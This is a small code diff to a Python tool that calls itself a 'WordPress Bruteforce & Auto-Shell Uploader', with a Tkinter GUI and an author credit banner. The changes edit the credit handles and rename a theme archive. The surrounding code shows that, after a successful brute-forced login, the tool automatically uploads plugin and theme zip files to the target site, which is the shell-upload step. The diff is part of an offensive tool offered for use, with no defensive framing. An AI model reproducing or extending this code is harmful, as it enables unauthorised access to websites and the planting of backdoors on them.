@@ -45,7 +45,7 @@ banner_cli = rf"""{Fore.GREEN}{Style.BRIGHT}
 ║        WordPress Bruteforce & Auto-Shell Uploader                ║
 ║                                                                  ║
 ║              Coded by  M4DI~UciH4                        ║
-║           t.me/madiganzz  |  github.com/RizkyEvory             ║
+║           t.me/madiganz  |  github.com/rizkyevory             ║
 ║                                                                  ║
 ╚══════════════════════════════════════════════════════════════════╝
 
@@ -203,8 +203,8 @@ class WPBrute:
 
                             if os.path.exists("plugin.zip"):
                                 await self.upload_file(client, url, "plugin.zip", "plugin")
-                            if os.path.exists("theme.zip"):
-                                await self.upload_file(client, url, "theme.zip", "theme")
+                            if os.path.exists("themes.zip"):
+                                await self.upload_file(client, url, "themes.zip", "theme")
                             logged_in = True
                             break
                         else:
@@ -397,7 +397,7 @@ class WPBruteGUI(tk.Tk):
             if plugin_zip and os.path.isfile(plugin_zip):
                 shutil.copy(plugin_zip, "plugin.zip")
             if theme_zip and os.path.isfile(theme_zip):
-                shutil.copy(theme_zip, "theme.zip")
+                shutil.copy(theme_zip, "themes.zip")
 
             brute = WPBrute(targets, self.pass_var.get(),
                             log_callback=self.gui_log,
